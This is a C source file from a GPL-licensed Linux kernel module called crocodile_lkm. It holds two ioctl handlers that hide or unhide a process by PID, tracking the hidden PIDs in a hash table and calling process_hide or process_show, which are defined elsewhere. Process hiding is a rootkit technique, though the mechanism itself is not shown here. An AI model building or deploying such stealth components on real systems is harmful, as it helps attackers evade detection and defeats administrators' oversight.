/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "device/details/hash_tbl.h"
#include "device/details/ioctl_cmd.h"
#include "proc/proc.h"

int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
{
    int retval = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        return -ERESTARTSYS;
    }
    if (hash_tbl_insert(&p_dev->hash_tbl, pid)) {
        retval = process_hide(pid);
        if (retval != 0) {
            hash_tbl_erase(&p_dev->hash_tbl, pid);
        }
    }
    mutex_unlock(&p_dev->lock);
    return retval;
}

int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
{
    int retval = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        return -ERESTARTSYS;
    }
    if (hash_tbl_erase(&p_dev->hash_tbl, pid)) {
        retval = process_show(pid);
    }
    mutex_unlock(&p_dev->lock);
    return retval;
}

